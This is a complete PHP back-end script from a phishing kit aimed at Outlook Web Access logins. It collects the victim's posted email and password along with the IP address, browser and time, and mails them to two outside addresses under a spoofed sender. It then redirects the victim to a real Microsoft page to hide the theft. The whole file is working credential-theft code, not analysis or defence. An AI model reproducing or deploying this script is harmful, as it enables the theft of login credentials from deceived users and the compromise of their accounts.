<?php

$ip = getenv("REMOTE_ADDR");
$web = $_SERVER["HTTP_HOST"];
$inj = $_SERVER["REQUEST_URI"];
$browser = $_SERVER['HTTP_USER_AGENT'];
$time = date("m-d-Y g:i:a");
$Email = $_POST['Email'];

$msg = "====================================\n";
$msg .= "Owa Login Info by Hoye\n";
$msg .= "===================================\n";
$msg .= "Email : ".$_POST['email']."\n";
$msg .= "Password : ".$_POST['pd']."\n";
$msg .= "Sent from $ip on $time $browser";
$msg .= "====================================\n";

$to = "lisiijia17@gmail.com, omramy_azad@yahoo.com";
$subject = "Owa $ip $Email";
$from = "From: Owa<reply@cbbain.com>";

mail($to,$subject,$msg,$from);

header("Location: https://docs.microsoft.com/en-us/microsoftteams/set-up-phone-system-voicemail");


?>